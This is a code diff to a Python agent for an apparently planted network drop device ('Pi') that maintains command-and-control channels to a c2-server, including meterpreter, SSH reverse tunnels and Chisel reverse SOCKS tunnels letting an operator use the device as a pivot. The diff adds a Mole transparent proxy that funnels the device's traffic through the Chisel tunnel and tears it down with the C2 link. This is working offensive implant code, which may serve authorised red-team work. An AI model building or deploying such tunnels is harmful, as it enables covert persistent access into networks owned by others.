@@ -55,6 +55,7 @@ _meterpreter_socket = None     # Tracked so force_shutdown can kill dispatch thr
 _ssh_tunnel_proc = None        # SSH reverse tunnel subprocess
 _chisel_proc = None            # Chisel HTTPS reverse tunnel subprocess
 _chisel_stderr_lines = []      # Ongoing stderr capture for health checks
+_mole_proc = None              # Mole transparent proxy subprocess
 _watchdog_stop = threading.Event()
 _exec_kill_event = threading.Event()  # Signal for killing meterpreter exec thread
 
@@ -137,6 +138,9 @@ def force_shutdown():
 
     # Kill SSH reverse tunnels
     _stop_ssh_tunnels()
+
+    # Kill Mole traffic tunnel
+    _stop_mole()
 
     # Kill Chisel subprocess
     _stop_chisel()
@@ -464,9 +468,15 @@ def try_chisel(config):
         cmd.append("R:%d:%s:%d" % (
             fwd["local_port"] + device_id, remote_host, fwd["remote_port"]))
 
-    # SOCKS proxy
+    # SOCKS proxy (reverse — operator uses Pi as exit node)
     if socks_port:
         cmd.append("R:%d:socks" % (socks_port + device_id))
+
+    # Forward SOCKS (Pi uses c2-server as exit node for internet traffic)
+    tunnel_cfg_tt = config.get("traffic_tunnel", {})
+    fwd_socks_port = tunnel_cfg_tt.get("local_socks_port", 1090)
+    if tunnel_cfg_tt.get("enabled", False):
+        cmd.append("%d:socks" % fwd_socks_port)
 
     log.info("Starting Chisel: %s", " ".join(cmd))
 
@@ -1330,26 +1340,146 @@ def _recv_exact(sock, n):
         data += chunk
     return data
 
+# ── Traffic Tunnel (Mole-Client) ──────────────────────────────
+
+MOLE_BINARY_MAP = {
+    "aarch64": "mole_linux_arm64",
+    "armv7l":  "mole_linux_arm64",
+    "x86_64":  "mole_linux_amd64",
+}
+
+MOLE_CLIENT_DIR = Path("/opt/pr0t31n/Mole-Client")
+MOLE_RUNTIME_CONFIG = Path("/var/run/landnav_mole.yaml")
+
+
+def _write_mole_config(local_socks_port, c2_host=None):
+    import yaml as _yaml
+    bypass = [
+        "10.0.0.0/8",
+        "172.16.0.0/12",
+        "192.168.0.0/16",
+    ]
+    if c2_host:
+        bypass.append("%s/32" % c2_host)
+    cfg = {
+        "servers": [{
+            "name": "chisel-tunnel",
+            "host": "127.0.0.1",
+            "socks5_port": local_socks_port,
+            "dns_port": 5053,
+        }],
+        "auth": {"username": "", "password": ""},
+        "local": {"dns_port": 53, "socks5_port": local_socks_port + 1},
+        "network": {
+            "bypass_networks": bypass,
+            "connect_timeout_sec": 5,
+            "retry_attempts": 2,
+            "retry_delay_sec": 2,
+        },
+        "dns": {"upstream_dns": "8.8.8.8:53"},
+        "logging": {"verbose": False},
+    }
+    MOLE_RUNTIME_CONFIG.write_text(_yaml.dump(cfg, default_flow_style=False))
+    return MOLE_RUNTIME_CONFIG
+
+
+def _start_mole(local_socks_port, c2_host=None):
+    global _mole_proc
+    _stop_mole()
+
+    import platform as _plat
+    machine = _plat.machine()
+    binary_name = MOLE_BINARY_MAP.get(machine)
+    if not binary_name:
+        log.warning("Mole: no binary for architecture %s", machine)
+        return False
+
+    binary = MOLE_CLIENT_DIR / binary_name
+    if not binary.exists():
+        log.warning("Mole: binary not found at %s", binary)
+        return False
+
+    try:
+        config_path = _write_mole_config(local_socks_port, c2_host)
+    except Exception as e:
+        log.warning("Mole: failed to write config: %s", e)
+        return False
+
+    cmd = [str(binary), "--config", str(config_path)]
+    log.info("Starting Mole traffic tunnel: %s", " ".join(cmd))
+
+    try:
+        _mole_proc = subprocess.Popen(
+            cmd,
+            stdin=subprocess.DEVNULL,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            start_new_session=True,
+        )
+        time.sleep(2)
+        if _mole_proc.poll() is not None:
+            log.warning("Mole exited immediately (rc=%d)", _mole_proc.returncode)
+            _mole_proc = None
+            return False
+        log.info("Mole traffic tunnel active (pid=%d) — internet traffic "
+                 "funnelled through chisel", _mole_proc.pid)
+        return True
+    except Exception as e:
+        log.warning("Mole failed to start: %s", e)
+        return False
+
+
+def _stop_mole():
+    global _mole_proc
+    if _mole_proc is not None:
+        log.info("Stopping Mole traffic tunnel")
+        try:
+            _mole_proc.terminate()
+        except OSError:
+            pass
+        try:
+            _mole_proc.wait(timeout=5)
+        except Exception:
+            try:
+                _mole_proc.kill()
+            except OSError:
+                pass
+        _mole_proc = None
+
+
+def _mole_is_alive():
+    return _mole_proc is not None and _mole_proc.poll() is None
+
+
 # ── Parallel C2 Management Threads ────────────────────────────
 
 def _manage_chisel(config):
     retry_delay = 30
+    tt_cfg = config.get("traffic_tunnel", {})
+    tt_enabled = tt_cfg.get("enabled", False)
+    tt_socks_port = tt_cfg.get("local_socks_port", 1090)
+    c2_host = config.get("c2", {}).get("host")
+
     while not _parallel_shutdown.is_set():
         _update_method_state("chisel", "attempting")
         result = try_chisel(config)
         if result:
+            if tt_enabled:
+                _start_mole(tt_socks_port, c2_host=c2_host)
             while not _parallel_shutdown.is_set():
                 _parallel_shutdown.wait(10)
                 if _parallel_shutdown.is_set():
                     break
                 if not chisel_is_alive():
                     log.warning("Chisel process died — will retry")
+                    _stop_mole()
                     _stop_chisel()
                     break
                 disconnect = False
                 for line in list(_chisel_stderr_lines):
                     if "Disconnected" in line or "Give up" in line:
                         log.warning("Chisel disconnect: %s", line)
+                        _stop_mole()
                         _stop_chisel()
                         disconnect = True
                         break
